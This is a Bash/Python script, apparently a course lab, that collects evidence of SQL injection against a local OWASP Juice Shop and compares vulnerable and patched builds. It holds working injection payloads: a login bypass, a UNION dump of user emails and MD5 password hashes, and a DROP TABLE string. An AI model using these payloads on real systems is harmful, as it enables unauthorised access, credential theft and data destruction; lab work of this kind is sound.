#!/usr/bin/env bash
# =====================================================================================
# SI3006 — Genera toda la evidencia del trabajo en un solo paso.
# Requiere: docker, curl, python3.   Uso: ./generar_evidencias.sh [URL_VULNERABLE] [URL_REMEDIADO]
#   URL_VULNERABLE  por defecto http://localhost:3000  (imagen oficial v20.3.0)
#   URL_REMEDIADO   por defecto http://localhost:3001  (código fuente con el parche)
# =====================================================================================
set -uo pipefail
VULN="${1:-http://localhost:3000}"
FIX="${2:-http://localhost:3001}"
DEST="$(cd "$(dirname "$0")" && pwd)"
PY=python3

echo "== 1. Recolección de evidencia sobre el servicio vulnerable =="
$PY - "$VULN" "$DEST" <<'PY'
import json, sys, urllib.parse, urllib.request, urllib.error, hashlib
base, dest = sys.argv[1], sys.argv[2]

def post_login(base, email, pw="x"):
    req = urllib.request.Request(base + "/rest/user/login",
        data=json.dumps({"email": email, "password": pw}).encode(),
        headers={"Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req); return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def get(base, path):
    try:
        r = urllib.request.urlopen(base + path); return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

# --- bypass de autenticación
code, body = post_login(base, "' OR 1=1--")
open(f"{dest}/01_login_bypass_respuesta.json", "w").write(body)
tok = json.loads(body)["authentication"]["token"]
print(f"  login bypass  -> HTTP {code}, rol admin en el JWT")

# --- acceso a recurso solo-admin con el token robado
c1, _ = get(base, "/api/Users")
c2, users = get(base, "/api/Users")
import urllib.request as u2
req = u2.Request(base + "/api/Users", headers={"Authorization": "Bearer " + tok})
c2 = u2.urlopen(req).status
print(f"  /api/Users sin token -> HTTP {c1}  |  con token inyectado -> HTTP {c2}")

# --- UNION based: volcado de la tabla Users
q = "qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--"
c3, dump = get(base, "/rest/products/search?q=" + urllib.parse.quote(q))
open(f"{dest}/02_union_dump_usuarios.json", "w").write(dump)
rows = json.loads(dump)["data"]
with open(f"{dest}/02_union_dump_usuarios.txt", "w") as f:
    f.write("id | email | hash_md5(password)\n" + "-"*70 + "\n")
    for r in sorted(rows, key=lambda x: x["id"]):
        f.write(f'{r["id"]:>3} | {r["name"]:38} | {r["description"]}\n')
print(f"  UNION dump    -> {len(rows)} usuarios (email + hash MD5 sin sal)")

md5_admin = hashlib.md5(b"admin123").hexdigest()
print(f"  md5('admin123') = {md5_admin}  -> {'COINCIDE con el hash del admin filtrado' if md5_admin in dump else 'no coincide'}")
PY

echo
echo "== 2. Comparación antes/después (vulnerable vs. remediado) =="
$PY - "$VULN" "$FIX" "$DEST" <<'PY'
import json, sys, urllib.parse, urllib.request, urllib.error
vuln, fix, dest = sys.argv[1], sys.argv[2], sys.argv[3]
PAYLOADS = [
    ("login", "' OR 1=1--"),
    ("login", "admin@juice-sh.op'--"),
    ("login", "' OR '1'='1' --"),
    ("login", "'; DROP TABLE Users;--"),
    ("login", "' UNION SELECT 1,2,3--"),
    ("search", "qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--"),
    ("search", "apple')) UNION SELECT 1,email,password,4,5,6,7,8,9,10 FROM Users--"),
    ("search", "%' OR 1=1--"),
    ("search", "qwert')) AND 1=2--"),
]
def login(base, e):
    r = urllib.request.Request(base + "/rest/user/login", data=json.dumps({"email": e, "password": "x"}).encode(),
                               headers={"Content-Type": "application/json"})
    try: return urllib.request.urlopen(r).status, urllib.request.urlopen(r).read().decode()
    except urllib.error.HTTPError as x: return x.code, x.read().decode()
def search(base, q):
    try:
        r = urllib.request.urlopen(base + "/rest/products/search?q=" + urllib.parse.quote(q))
        return r.status, r.read().decode()
    except urllib.error.HTTPError as x: return x.code, x.read().decode()
def classify(kind, code, body):
    if kind == "login":
        return "BYPASS (token admin)" if code == 200 and '"token"' in body else f"bloqueado ({code})"
    try: rows = json.loads(body).get("data", [])
    except Exception: return f"error ({code})"
    return f"EXFILTRACION ({len(rows)} usuarios)" if any("@" in str(r.get("name", "")) for r in rows) else f"normal ({len(rows)} filas)"
out = []
for base, label in ((vuln, "VULNERABLE"), (fix, "REMEDIADO")):
    out.append(f"\n=== {label} ({base}) ===")
    for kind, p in PAYLOADS:
        code, body = (login(base, p) if kind == "login" else search(base, p))
        out.append(f"  [{kind:6}] {p[:56]:58} -> HTTP {code} | {classify(kind, code, body)}")
txt = "\n".join(out)
open(f"{dest}/03_comparativa_antes_despues.txt", "w").write(txt)
print(txt)
PY

echo
echo "== 3. Regresión: el login legítimo sigue funcionando =="
for cred in '{"email":"admin@juice-sh.op","password":"admin123"}' \
            '{"email":"jim@juice-sh.op","password":"ncc-1701"}'; do
  printf '  %-52s -> HTTP %s\n' "$cred" \
    "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$FIX/rest/user/login" -H 'Content-Type: application/json' -d "$cred")"
done

echo
echo "Listo. Evidencia en: $DEST"
